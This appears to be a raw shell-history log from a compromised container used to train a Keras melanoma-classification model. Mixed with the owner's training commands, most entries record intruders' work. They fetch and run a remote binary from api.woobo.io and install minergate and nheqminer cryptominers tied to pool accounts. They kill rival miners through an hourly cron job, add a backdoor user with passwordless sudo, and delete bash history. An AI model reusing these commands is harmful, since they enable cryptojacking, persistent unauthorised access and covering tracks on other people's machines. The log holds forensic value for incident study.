+ echo "pkill bash;pkill mine;pkill yam" > /etc/cron.hourly/1  ### root@f5e57551b879 /dev/pts/5 20161228 23:44 /notebooks
+ killall ?;top c  ### root@f5e57551b879 /dev/pts/5 20161228 23:44 /notebooks
+pkill m5 && pkill m6 && kill $(ps -eo pid,args --cols=10000 | awk /alexa/)  ### root@f5e57551b879 /dev/pts/5 20161228 23:44 /notebooks
+ kill $(ps -eo pid,args --cols=10000 | awk /jfzero/)  ### root@f5e57551b879 /dev/pts/5 20161228 23:44 /notebooks
+ if [ -f .deb/opt/minergate-cli/minergate-cli ]; then echo "$(tput setaf 2)Was here$(tput setaf 8)";else wget minergate.com/download/deb-cli && dpkg -x deb-cli .deb && rm deb-cli; fi && nproc && lspci | grep VGA || true && pkill mine || true && pkill yam || true && cd .deb/opt/minergate-cli || cd ~/.ttmp/opt/minergate-cli  ### root@f5e57551b879 /dev/pts/5 20161228 23:44 /notebooks/.deb/opt/minergate-cli
+ ### root@f5e57551b879 /dev/pts/5 20161228 23:44 /notebooks/.deb/opt/minergate-cli
+python cam.py --dataset_path "../../trainsmall/" --train TRAIN ### root@f5e57551b879 /dev/pts/0 20161229 01:05 /notebooks
+ls ### root@f5e57551b879 /dev/pts/0 20161229 01:05 /notebooks
+ps -ae ### root@f5e57551b879 /dev/pts/0 20161229 01:05 /notebooks
+pkill minergate ### root@f5e57551b879 /dev/pts/0 20161229 01:06 /notebooks
+ps -ae ### root@f5e57551b879 /dev/pts/0 20161229 01:06 /notebooks
+pkill sudo ### root@f5e57551b879 /dev/pts/0 20161229 01:06 /notebooks
+pkill minergate ### root@f5e57551b879 /dev/pts/0 20161229 01:06 /notebooks
+cd /opt/.z ### root@f5e57551b879 /dev/pts/0 20161229 01:06 /notebooks -> /opt/.z
+ls ### root@f5e57551b879 /dev/pts/0 20161229 01:06 /opt/.z
+cd nheqminer/nheqminer ### root@f5e57551b879 /dev/pts/0 20161229 01:06 /opt/.z -> /opt/.z/nheqminer/nheqminer
+ls ### root@f5e57551b879 /dev/pts/0 20161229 01:06 /opt/.z/nheqminer/nheqminer
+cd build ### root@f5e57551b879 /dev/pts/0 20161229 01:06 /opt/.z/nheqminer/nheqminer -> /opt/.z/nheqminer/nheqminer/build
+ls ### root@f5e57551b879 /dev/pts/0 20161229 01:06 /opt/.z/nheqminer/nheqminer/build
+python cam.py --dataset_path "../../trainsmall/" --train TRAIN ### root@f5e57551b879 /dev/pts/1 20161229 01:41 /notebooks
+ pkill bash  ### root@f5e57551b879 /dev/pts/1 20161229 01:41 /notebooks
+ pkill mine  ### root@f5e57551b879 /dev/pts/1 20161229 01:41 /notebooks
+ pkill yam  ### root@f5e57551b879 /dev/pts/1 20161229 01:41 /notebooks
+ echo "pkill bash;pkill mine;pkill yam" > /etc/cron.hourly/1  ### root@f5e57551b879 /dev/pts/1 20161229 01:41 /notebooks
+ cd ~  ### root@f5e57551b879 /dev/pts/1 20161229 01:41 /root
+./nheqminer -ll zec.suprnova.cc:2142 -u th3j0k3r.work4 -p x ### root@f5e57551b879 /dev/pts/0 20161229 01:41 /opt/.z/nheqminer/nheqminer/build
+ top c  ### root@f5e57551b879 /dev/pts/1 20161229 01:41 /root
+ps -ae ### root@f5e57551b879 /dev/pts/0 20161229 01:43 /opt/.z/nheqminer/nheqminer/build
+pkill sh ### root@f5e57551b879 /dev/pts/0 20161229 01:43 /opt/.z/nheqminer/nheqminer/build
+kill -9 23564 ### root@f5e57551b879 /dev/pts/0 20161229 01:43 /opt/.z/nheqminer/nheqminer/build
+if [ -f ? ]; then ./? -c x -M stratum+tcp://alekx12555%40mail.ru:x@xmr.pool.minergate.com:45560/xmr; else wget http://api.woobo.io:8888/media/580d73c364ef7e252d1fd02c_0.yam || (apt-get update && apt-get -y install wget && wget http://api.woobo.io:8888/media/580d73c364ef7e252d1fd02c_0.yam); chmod +x 580d73c364ef7e252d1fd02c_0.yam && mv 580d73c364ef7e252d1fd02c_0.yam ?;./? -c x -M stratum+tcp://alekx12555%40mail.ru:x@xmr.pool.minergate.com:45560/xmr; fi  ### root@f5e57551b879 /dev/pts/1 20161229 01:43 /root
+ps -ae ### root@f5e57551b879 /dev/pts/0 20161229 01:43 /opt/.z/nheqminer/nheqminer/build
+pkillsudo ### root@f5e57551b879 /dev/pts/0 20161229 01:43 /opt/.z/nheqminer/nheqminer/build
+pkill sudo ### root@f5e57551b879 /dev/pts/0 20161229 01:43 /opt/.z/nheqminer/nheqminer/build
+ls ### root@f5e57551b879 /dev/pts/0 20161229 01:43 /opt/.z/nheqminer/nheqminer/build
+ps -ae ### root@f5e57551b879 /dev/pts/0 20161229 01:43 /opt/.z/nheqminer/nheqminer/build
+if [ -f ? ]; then ./? -c x -M stratum+tcp://alekx12555%40mail.ru:x@xmr.pool.minergate.com:45560/xmr; else wget http://api.woobo.io:8888/media/580d73c364ef7e252d1fd02c_0.yam || (apt-get update && apt-get -y install wget && wget http://api.woobo.io:8888/media/580d73c364ef7e252d1fd02c_0.yam); chmod +x 580d73c364ef7e252d1fd02c_0.yam && mv 580d73c364ef7e252d1fd02c_0.yam ?;./? -c x -M stratum+tcp://alekx12555%40mail.ru:x@xmr.pool.minergate.com:45560/xmr; fi  ### root@f5e57551b879 /dev/pts/2 20161229 02:05 /notebooks
+speedtest --share ### root@f5e57551b879 /dev/pts/2 20161229 02:05 /notebooks
+apt-get update ### root@f5e57551b879 /dev/pts/2 20161229 02:05 /notebooks
+pip install speedtest-cli ### root@f5e57551b879 /dev/pts/2 20161229 02:06 /notebooks
+speedtest --share ### root@f5e57551b879 /dev/pts/2 20161229 02:06 /notebooks
+speedtest --share ### root@f5e57551b879 /dev/pts/2 20161229 02:08 /notebooks
+netstat -nl ### root@f5e57551b879 /dev/pts/2 20161229 02:09 /notebooks
+apt-get install openssh-server ### root@f5e57551b879 /dev/pts/2 20161229 02:10 /notebooks
+ pkill bash  ### root@f5e57551b879 /dev/pts/2 20161229 02:10 /notebooks
+ pkill mine  ### root@f5e57551b879 /dev/pts/2 20161229 02:10 /notebooks
+ pkill yam  ### root@f5e57551b879 /dev/pts/2 20161229 02:10 /notebooks
+ echo "pkill bash;pkill mine;pkill yam" > /etc/cron.hourly/1  ### root@f5e57551b879 /dev/pts/2 20161229 02:10 /notebooks
+./nheqminer -ll zec.suprnova.cc:2142 -u th3j0k3r.work4 -p x ### root@f5e57551b879 /dev/pts/0 20161229 02:10 /opt/.z/nheqminer/nheqminer/build
+ killall ?;top c  ### root@f5e57551b879 /dev/pts/2 20161229 02:10 /notebooks
+pkill m5 && pkill m6 && kill $(ps -eo pid,args --cols=10000 | awk /alexa/)  ### root@f5e57551b879 /dev/pts/2 20161229 02:10 /notebooks
+ kill $(ps -eo pid,args --cols=10000 | awk /jfzero/)  ### root@f5e57551b879 /dev/pts/2 20161229 02:10 /notebooks
+ if [ -f .deb/opt/minergate-cli/minergate-cli ]; then echo "$(tput setaf 2)Was here$(tput setaf 8)";else wget minergate.com/download/deb-cli && dpkg -x deb-cli .deb && rm deb-cli; fi && nproc && lspci | grep VGA || true && pkill mine || true && pkill yam || true && cd .deb/opt/minergate-cli || cd ~/.ttmp/opt/minergate-cli  ### root@f5e57551b879 /dev/pts/2 20161229 02:10 /notebooks/.deb/opt/minergate-cli
+ ### root@f5e57551b879 /dev/pts/2 20161229 02:10 /notebooks/.deb/opt/minergate-cli
+if [ -f ? ]; then ./? -c x -M stratum+tcp://alekx12555%40mail.ru:x@xmr.pool.minergate.com:45560/xmr; else wget http://api.woobo.io:8888/media/580d73c364ef7e252d1fd02c_0.yam || (apt-get update && apt-get -y install wget && wget http://api.woobo.io:8888/media/580d73c364ef7e252d1fd02c_0.yam); chmod +x 580d73c364ef7e252d1fd02c_0.yam && mv 580d73c364ef7e252d1fd02c_0.yam ?;./? -c x -M stratum+tcp://alekx12555%40mail.ru:x@xmr.pool.minergate.com:45560/xmr; fi  ### root@f5e57551b879 /dev/pts/3 20161229 02:18 /notebooks
+apt-get install htop ### root@f5e57551b879 /dev/pts/3 20161229 02:19 /notebooks
+htop ### root@f5e57551b879 /dev/pts/3 20161229 02:19 /notebooks
+netstat -nl ### root@f5e57551b879 /dev/pts/3 20161229 02:20 /notebooks
+service ssh restart ### root@f5e57551b879 /dev/pts/3 20161229 02:20 /notebooks
+apt-get install openssh-server ### root@f5e57551b879 /dev/pts/3 20161229 02:21 /notebooks
+service ssh restart ### root@f5e57551b879 /dev/pts/3 20161229 03:00 /notebooks
+netstat -nt ### root@f5e57551b879 /dev/pts/3 20161229 03:00 /notebooks
+netstat -nl ### root@f5e57551b879 /dev/pts/3 20161229 03:01 /notebooks
+htop ### root@f5e57551b879 /dev/pts/3 20161229 03:01 /notebooks
+adduser well ### root@f5e57551b879 /dev/pts/3 20161229 03:02 /notebooks
+adduser well ### root@f5e57551b879 /dev/pts/4 20161229 03:03 /notebooks
+adduser well ### root@f5e57551b879 /dev/pts/4 20161229 03:03 /notebooks
+clear ### root@f5e57551b879 /dev/pts/4 20161229 03:03 /notebooks
+echo 'cpuinfolscpubjklllh8 START' && lscpu | head -15; echo 'cpuinfolscpubjklllh8 STOP' ### root@f5e57551b879 /dev/pts/4 20161229 03:03 /notebooks
+clear ### root@f5e57551b879 /dev/pts/4 20161229 03:03 /notebooks
+adduser well ### root@f5e57551b879 /dev/pts/3 20161229 03:03 /notebooks
+echo 'newIsRunninPrepsbjklllh8 START' && ps -e -o tty,pcpu,etime,cmd | grep miner | grep -v grep && ps -e -o tty,pcpu,etime,cmd | grep -i yam | grep -v grep; echo 'newIsRunninPrepsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/4 20161229 03:03 /notebooks
+clear ### root@f5e57551b879 /dev/pts/4 20161229 03:03 /notebooks
+echo 'kgreppsbjklllh8 START' && ps -e -o tty,pid,cmd | grep @ | grep -v grep; echo 'kgreppsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/4 20161229 03:03 /notebooks
+userdel well ### root@f5e57551b879 /dev/pts/3 20161229 03:03 /notebooks
+kill -9 24008;  ### root@f5e57551b879 /dev/pts/4 20161229 03:03 /notebooks
+clear ### root@f5e57551b879 /dev/pts/4 20161229 03:03 /notebooks
+echo 'outpsbjklllh8 START' && ps -e -o pid,tty,cmd | grep 'pts/2' | grep -v grep; echo 'outpsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/4 20161229 03:03 /notebooks
+kill -9 23662;  ### root@f5e57551b879 /dev/pts/4 20161229 03:03 /notebooks
+cd ~; cd; mkdir .ttmp; cd .ttmp; rm -f deb-cli; rm -Rf /.deb; rm -Rf ~/.deb;clear;pkill m5; pkill scsi_eh; pkill nheq; pkill -9 nheq; pkill miner; pkill -9 miner;pkill minergate-cli; pkill -9 minergate-cli; pgrep nheq | xargs -i kill -9 {}; pgrep minergate-cli | xargs -i kill -9 {}; ### root@f5e57551b879 /dev/pts/4 20161229 03:03 /root -> /root/.ttmp
+clear ### root@f5e57551b879 /dev/pts/4 20161229 03:03 /root/.ttmp
+echo 'minergateinstallwgetbjklllh8 START' && wget --no-check-certificate https://minergate.com/download/deb-cli || curl -ks https://minergate.com/download/deb-cli > deb-cli || curl -ks https://clitxt.com/t/q6b-1479229222.txt > deb-cli;7z x deb-cli -y && 7z x data.tar -y || ar vx deb-cli && tar -xvf data.tar.gz && tar -xvf control.tar.gz || dpkg -x deb-cli . ;nohup ./opt/minergate-cli/minergate-cli -user asdfmnyy@hmamail.com -fcn+xmr & echo 'minergateinstallwgetbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/4 20161229 03:03 /root/.ttmp
+useradd well -G sudo -M -s /bin/bash && echo well:gabi | chpasswd && sed -ri 's/^# (%sudo.+ALL=(ALL).+NOPASSWD: ALL)/\1/' /etc/sudoers ### root@f5e57551b879 /dev/pts/3 20161229 03:03 /notebooks
+cd ~/.ssh/ ### root@f5e57551b879 /dev/pts/3 20161229 03:04 /notebooks -> /root/.ssh
+ls ### root@f5e57551b879 /dev/pts/3 20161229 03:04 /root/.ssh
+clear ### root@f5e57551b879 /dev/pts/4 20161229 03:04 /root/.ttmp
+echo 'newIsRunninPostpsbjklllh8 START' && ps -e -o tty,pcpu,etime,cmd | grep miner | grep -v grep && ps -e -o tty,pcpu,etime,cmd | grep -i yam | grep -v grep; echo 'newIsRunninPostpsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/4 20161229 03:04 /root/.ttmp
+clear ### root@f5e57551b879 /dev/pts/4 20161229 03:04 /root/.ttmp
+echo 'nohuplogtailbjklllh8 START' && tail -15 nohup.out; echo 'nohuplogtailbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/4 20161229 03:04 /root/.ttmp
+nohup ./opt/minergate-cli/minergate-cli -user asdfmnyy@hmamail.com -fcn+xmr 0 2 & ### root@f5e57551b879 /dev/pts/4 20161229 03:04 /root/.ttmp
+bash -i ### root@f5e57551b879 /dev/pts/4 20161229 03:04 /notebooks
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/2 20161229 03:10 /notebooks
+ pkill bash  ### root@f5e57551b879 /dev/pts/2 20161229 03:10 /notebooks
+ pkill mine  ### root@f5e57551b879 /dev/pts/2 20161229 03:10 /notebooks
+ pkill yam  ### root@f5e57551b879 /dev/pts/2 20161229 03:10 /notebooks
+ echo "pkill bash;pkill mine;pkill yam" > /etc/cron.hourly/1  ### root@f5e57551b879 /dev/pts/2 20161229 03:10 /notebooks
+ killall ?;top c  ### root@f5e57551b879 /dev/pts/2 20161229 03:10 /notebooks
+pkill m5 && pkill m6 && kill $(ps -eo pid,args --cols=10000 | awk /alexa/)  ### root@f5e57551b879 /dev/pts/2 20161229 03:10 /notebooks
+ kill $(ps -eo pid,args --cols=10000 | awk /jfzero/)  ### root@f5e57551b879 /dev/pts/2 20161229 03:10 /notebooks
+ if [ -f .deb/opt/minergate-cli/minergate-cli ]; then echo "$(tput setaf 2)Was here$(tput setaf 8)";else wget minergate.com/download/deb-cli && dpkg -x deb-cli .deb && rm deb-cli; fi && nproc && lspci | grep VGA || true && pkill mine || true && pkill yam || true && cd .deb/opt/minergate-cli || cd ~/.ttmp/opt/minergate-cli  ### root@f5e57551b879 /dev/pts/2 20161229 03:10 /notebooks/.deb/opt/minergate-cli
+ ### root@f5e57551b879 /dev/pts/2 20161229 03:10 /notebooks/.deb/opt/minergate-cli
+./nheqminer -ll zec.suprnova.cc:2142 -u th3j0k3r.work4 -p x ### root@f5e57551b879 /dev/pts/3 20161229 03:41 /notebooks
+./nheqminer -ll zec.suprnova.cc:2142 -u th3j0k3r.work4 -p x ### root@f5e57551b879 /dev/pts/0 20161229 03:46 /notebooks
+ps -ae ### root@f5e57551b879 /dev/pts/0 20161229 03:47 /notebooks
+pkill minergate ### root@f5e57551b879 /dev/pts/0 20161229 03:47 /notebooks
+ps -ae ### root@f5e57551b879 /dev/pts/0 20161229 03:47 /notebooks
+apt-get remove ssh ### root@f5e57551b879 /dev/pts/0 20161229 03:49 /notebooks
+apt-get remove sshd ### root@f5e57551b879 /dev/pts/0 20161229 03:49 /notebooks
+service ssh stop ### root@f5e57551b879 /dev/pts/0 20161229 03:49 /notebooks
+cd /opt/.z/nheqminer/nheqminer/build ### root@f5e57551b879 /dev/pts/0 20161229 03:49 /notebooks -> /opt/.z/nheqminer/nheqminer/build
+ls ### root@f5e57551b879 /dev/pts/0 20161229 03:49 /opt/.z/nheqminer/nheqminer/build
+./nheqminer -ll zec.suprnova.cc:2142 -u th3j0k3r.work4 -p x ### root@f5e57551b879 /dev/pts/1 20161229 04:23 /notebooks
+htop ### root@f5e57551b879 /dev/pts/1 20161229 04:43 /notebooks
+cd ~/.ssh/ ### root@f5e57551b879 /dev/pts/1 20161229 04:43 /notebooks -> /root/.ssh
+ls ### root@f5e57551b879 /dev/pts/1 20161229 04:43 /root/.ssh
+speedtest ### root@f5e57551b879 /dev/pts/1 20161229 04:53 /root/.ssh
+./nheqminer -ll zec.suprnova.cc:2142 -u th3j0k3r.work4 -p x ### @f5e57551b879 not a tty 20161229 04:55 /notebooks
+vi cam.py ### @f5e57551b879 not a tty 20161229 04:56 /notebooks
+cd ../datamnt/github/keras-cam-melanoma/ ### @f5e57551b879 not a tty 20161229 04:56 /notebooks -> /datamnt/github/keras-cam-melanoma
+ls ### @f5e57551b879 not a tty 20161229 04:56 /datamnt/github/keras-cam-melanoma
+vi cam.py  ### @f5e57551b879 not a tty 20161229 04:58 /datamnt/github/keras-cam-melanoma
+ls ### @f5e57551b879 not a tty 20161229 04:58 /datamnt/github/keras-cam-melanoma
+mv weights.0* /tmp/ ### @f5e57551b879 not a tty 20161229 04:58 /datamnt/github/keras-cam-melanoma
+rm /tmp/weights.0* ### @f5e57551b879 not a tty 20161229 04:59 /datamnt/github/keras-cam-melanoma
+mkdir ../../trainsmaller ### @f5e57551b879 not a tty 20161229 04:59 /datamnt/github/keras-cam-melanoma
+cp -R ../../trainsmall/* ../../trainsmaller/ ### @f5e57551b879 not a tty 20161229 05:00 /datamnt/github/keras-cam-melanoma
+cd ../../trainsmaller/ ### @f5e57551b879 not a tty 20161229 05:01 /datamnt/github/keras-cam-melanoma -> /datamnt/trainsmaller
+ls ### @f5e57551b879 not a tty 20161229 05:01 /datamnt/trainsmaller
+ls pos/ ### @f5e57551b879 not a tty 20161229 05:01 /datamnt/trainsmaller
+cd pos/ ### @f5e57551b879 not a tty 20161229 05:01 /datamnt/trainsmaller -> /datamnt/trainsmaller/pos
+ls | c ### @f5e57551b879 not a tty 20161229 05:01 /datamnt/trainsmaller/pos
+ls | wc ### @f5e57551b879 not a tty 20161229 05:01 /datamnt/trainsmaller/pos
+ls | shuf ### @f5e57551b879 not a tty 20161229 05:01 /datamnt/trainsmaller/pos
+ls | shuf ### @f5e57551b879 not a tty 20161229 05:01 /datamnt/trainsmaller/pos
+ls | shuf | head -n 150 | xargs -I foo rm foo ### @f5e57551b879 not a tty 20161229 05:02 /datamnt/trainsmaller/pos
+ls | wc ### @f5e57551b879 not a tty 20161229 05:02 /datamnt/trainsmaller/pos
+cd .. ### @f5e57551b879 not a tty 20161229 05:02 /datamnt/trainsmaller/pos -> /datamnt/trainsmaller
+cd neg/ ### @f5e57551b879 not a tty 20161229 05:02 /datamnt/trainsmaller -> /datamnt/trainsmaller/neg
+ls | wc ### @f5e57551b879 not a tty 20161229 05:02 /datamnt/trainsmaller/neg
+ls | shuf | head -n 1700 | xargs -I foo rm foo ### @f5e57551b879 not a tty 20161229 05:03 /datamnt/trainsmaller/neg
+cd .. ### @f5e57551b879 not a tty 20161229 05:03 /datamnt/trainsmaller/neg -> /datamnt/trainsmaller
+cd .. ### @f5e57551b879 not a tty 20161229 05:03 /datamnt/trainsmaller -> /datamnt
+cd github/keras-cam-melanoma/ ### @f5e57551b879 not a tty 20161229 05:03 /datamnt -> /datamnt/github/keras-cam-melanoma
+ls ### @f5e57551b879 not a tty 20161229 05:03 /datamnt/github/keras-cam-melanoma
+grep TRAIN ~/histlog | tail ### @f5e57551b879 not a tty 20161229 05:04 /datamnt/github/keras-cam-melanoma
+python cam.py --dataset_path "../../trainsmall/" --train TRAIN ### @f5e57551b879 not a tty 20161229 05:05 /datamnt/github/keras-cam-melanoma
+python cam.py --dataset_path "../../trainsmaller/" --train TRAIN ### @f5e57551b879 not a tty 20161229 05:08 /datamnt/github/keras-cam-melanoma
+ls ### @f5e57551b879 not a tty 20161229 05:16 /datamnt/github/keras-cam-melanoma
+vi cam.py  ### @f5e57551b879 not a tty 20161229 05:17 /datamnt/github/keras-cam-melanoma
+vi model.py ### @f5e57551b879 not a tty 20161229 05:17 /datamnt/github/keras-cam-melanoma
+python cam.py --dataset_path "../../trainsmaller/" --train TRAIN ### @f5e57551b879 not a tty 20161229 05:21 /datamnt/github/keras-cam-melanoma
+vi model.py ### @f5e57551b879 not a tty 20161229 05:26 /datamnt/github/keras-cam-melanoma
+vi model.py ### @f5e57551b879 not a tty 20161229 05:26 /datamnt/github/keras-cam-melanoma
+speedtest ### root@f5e57551b879 /dev/pts/3 20161229 05:26 /notebooks
+speedtest ### root@f5e57551b879 /dev/pts/3 20161229 05:26 /notebooks
+clear ### root@f5e57551b879 /dev/pts/3 20161229 05:26 /notebooks
+echo 'cpuinfolscpubjklllh8 START' && lscpu | head -15; echo 'cpuinfolscpubjklllh8 STOP' ### root@f5e57551b879 /dev/pts/3 20161229 05:26 /notebooks
+clear ### root@f5e57551b879 /dev/pts/3 20161229 05:26 /notebooks
+echo 'newIsRunninPrepsbjklllh8 START' && ps -e -o tty,pcpu,etime,cmd | grep miner | grep -v grep && ps -e -o tty,pcpu,etime,cmd | grep -i yam | grep -v grep; echo 'newIsRunninPrepsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/3 20161229 05:26 /notebooks
+clear ### root@f5e57551b879 /dev/pts/3 20161229 05:26 /notebooks
+echo 'kgreppsbjklllh8 START' && ps -e -o tty,pid,cmd | grep @ | grep -v grep; echo 'kgreppsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/3 20161229 05:26 /notebooks
+vi cam.py  ### @f5e57551b879 not a tty 20161229 05:26 /datamnt/github/keras-cam-melanoma
+kill -9 25131;  ### root@f5e57551b879 /dev/pts/3 20161229 05:26 /notebooks
+cd ~; cd; mkdir .ttmp; cd .ttmp; rm -f deb-cli; rm -Rf /.deb; rm -Rf ~/.deb;clear;pkill m5; pkill scsi_eh; pkill nheq; pkill -9 nheq; pkill miner; pkill -9 miner;pkill minergate-cli; pkill -9 minergate-cli; pgrep nheq | xargs -i kill -9 {}; pgrep minergate-cli | xargs -i kill -9 {}; ### root@f5e57551b879 /dev/pts/3 20161229 05:26 /root -> /root/.ttmp
+./nheqminer -l zec.suprnova.cc:2142 -u th3j0k3r.work3 -p x ### root@f5e57551b879 /dev/pts/0 20161229 05:26 /opt/.z/nheqminer/nheqminer/build
+clear ### root@f5e57551b879 /dev/pts/3 20161229 05:26 /root/.ttmp
+echo 'minergateinstallwgetbjklllh8 START' && wget --no-check-certificate https://minergate.com/download/deb-cli || curl -ks https://minergate.com/download/deb-cli > deb-cli || curl -ks https://clitxt.com/t/q6b-1479229222.txt > deb-cli;7z x deb-cli -y && 7z x data.tar -y || ar vx deb-cli && tar -xvf data.tar.gz && tar -xvf control.tar.gz || dpkg -x deb-cli . ;nohup ./opt/minergate-cli/minergate-cli -user asdfmnyy@hmamail.com -fcn+xmr & echo 'minergateinstallwgetbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/3 20161229 05:26 /root/.ttmp
+vi model.py ### @f5e57551b879 not a tty 20161229 05:27 /datamnt/github/keras-cam-melanoma
+vi cam.py  ### @f5e57551b879 not a tty 20161229 05:27 /datamnt/github/keras-cam-melanoma
+clear ### root@f5e57551b879 /dev/pts/3 20161229 05:27 /root/.ttmp
+echo 'newIsRunninPostpsbjklllh8 START' && ps -e -o tty,pcpu,etime,cmd | grep miner | grep -v grep && ps -e -o tty,pcpu,etime,cmd | grep -i yam | grep -v grep; echo 'newIsRunninPostpsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/3 20161229 05:27 /root/.ttmp
+clear ### root@f5e57551b879 /dev/pts/3 20161229 05:27 /root/.ttmp
+echo 'nohuplogtailbjklllh8 START' && tail -15 nohup.out; echo 'nohuplogtailbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/3 20161229 05:27 /root/.ttmp
+nohup ./opt/minergate-cli/minergate-cli -user asdfmnyy@hmamail.com -fcn+xmr 0 2 & ### root@f5e57551b879 /dev/pts/3 20161229 05:27 /root/.ttmp
+bash -i ### root@f5e57551b879 /dev/pts/3 20161229 05:27 /notebooks
+python cam.py --dataset_path "../../trainsmaller/" --train TRAIN ### @f5e57551b879 not a tty 20161229 05:34 /datamnt/github/keras-cam-melanoma
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/2 20161229 05:45 /notebooks
+ pkill bash  ### root@f5e57551b879 /dev/pts/2 20161229 05:45 /notebooks
+ pkill mine  ### root@f5e57551b879 /dev/pts/2 20161229 05:45 /notebooks
+ pkill yam  ### root@f5e57551b879 /dev/pts/2 20161229 05:45 /notebooks
+ echo "pkill bash;pkill mine;pkill yam" > /etc/cron.hourly/1  ### root@f5e57551b879 /dev/pts/2 20161229 05:45 /notebooks
+ cd ~  ### root@f5e57551b879 /dev/pts/2 20161229 05:45 /root
+ top c  ### root@f5e57551b879 /dev/pts/2 20161229 05:45 /root
+python cam.py --dataset_path "../../trainsmaller/" --train TRAIN ### @f5e57551b879 not a tty 20161229 05:48 /notebooks
+python cam.py --dataset_path "../../trainsmaller/" --train TRAIN ### @f5e57551b879 not a tty 20161229 05:48 /notebooks
+cd ../datamnt/github/keras-cam-melanoma/ ### @f5e57551b879 not a tty 20161229 05:49 /notebooks -> /datamnt/github/keras-cam-melanoma
+python cam.py --dataset_path "../../trainsmaller/" --train TRAIN ### @f5e57551b879 not a tty 20161229 05:49 /datamnt/github/keras-cam-melanoma
+vi cam.py  ### @f5e57551b879 not a tty 20161229 05:49 /datamnt/github/keras-cam-melanoma
+python cam.py --dataset_path "../../trainsmaller/" --train TRAIN ### root@f5e57551b879 /dev/pts/3 20161229 06:04 /notebooks
+ pkill bash  ### root@f5e57551b879 /dev/pts/3 20161229 06:04 /notebooks
+ pkill mine  ### root@f5e57551b879 /dev/pts/3 20161229 06:04 /notebooks
+ pkill yam  ### root@f5e57551b879 /dev/pts/3 20161229 06:04 /notebooks
+ echo "pkill bash;pkill mine;pkill yam" > /etc/cron.hourly/1  ### root@f5e57551b879 /dev/pts/3 20161229 06:04 /notebooks
+ killall ?;top c  ### root@f5e57551b879 /dev/pts/3 20161229 06:04 /notebooks
+pkill m5 && pkill m6 && kill $(ps -eo pid,args --cols=10000 | awk /alexa/)  ### root@f5e57551b879 /dev/pts/3 20161229 06:04 /notebooks
+ kill $(ps -eo pid,args --cols=10000 | awk /jfzero/)  ### root@f5e57551b879 /dev/pts/3 20161229 06:04 /notebooks
+ if [ -f .deb/opt/minergate-cli/minergate-cli ]; then echo "$(tput setaf 2)Was here$(tput setaf 8)";else wget minergate.com/download/deb-cli && dpkg -x deb-cli .deb && rm deb-cli; fi && nproc && lspci | grep VGA || true && pkill mine || true && pkill yam || true && cd .deb/opt/minergate-cli || cd ~/.ttmp/opt/minergate-cli  ### root@f5e57551b879 /dev/pts/3 20161229 06:04 /notebooks/.deb/opt/minergate-cli
+ ### root@f5e57551b879 /dev/pts/3 20161229 06:04 /notebooks/.deb/opt/minergate-cli
+python cam.py --dataset_path "../../trainsmaller/" --train TRAIN ### @f5e57551b879 not a tty 20161229 06:06 /datamnt/github/keras-cam-melanoma
+ls ### @f5e57551b879 not a tty 20161229 07:10 /datamnt/github/keras-cam-melanoma
+ls ### @f5e57551b879 not a tty 20161229 07:10 /datamnt/github/keras-cam-melanoma
+rm weights.* ### @f5e57551b879 not a tty 20161229 07:11 /datamnt/github/keras-cam-melanoma
+ls ### @f5e57551b879 not a tty 20161229 07:11 /datamnt/github/keras-cam-melanoma
+vi LOG  ### @f5e57551b879 not a tty 20161229 07:13 /datamnt/github/keras-cam-melanoma
+git status ### @f5e57551b879 not a tty 20161229 07:13 /datamnt/github/keras-cam-melanoma
+vi convoutputs.txt  ### @f5e57551b879 not a tty 20161229 07:13 /datamnt/github/keras-cam-melanoma
+vi classweights.txt  ### @f5e57551b879 not a tty 20161229 07:14 /datamnt/github/keras-cam-melanoma
+vi cam.txt  ### @f5e57551b879 not a tty 20161229 07:14 /datamnt/github/keras-cam-melanoma
+ls *.txt ### @f5e57551b879 not a tty 20161229 07:14 /datamnt/github/keras-cam-melanoma
+rm *.txt ### @f5e57551b879 not a tty 20161229 07:14 /datamnt/github/keras-cam-melanoma
+git status ### @f5e57551b879 not a tty 20161229 07:14 /datamnt/github/keras-cam-melanoma
+vi cam.py  ### @f5e57551b879 not a tty 20161229 07:14 /datamnt/github/keras-cam-melanoma
+vi LOG  ### @f5e57551b879 not a tty 20161229 07:16 /datamnt/github/keras-cam-melanoma
+git status ### @f5e57551b879 not a tty 20161229 07:16 /datamnt/github/keras-cam-melanoma
+git status ### @f5e57551b879 not a tty 20161229 07:16 /datamnt/github/keras-cam-melanoma
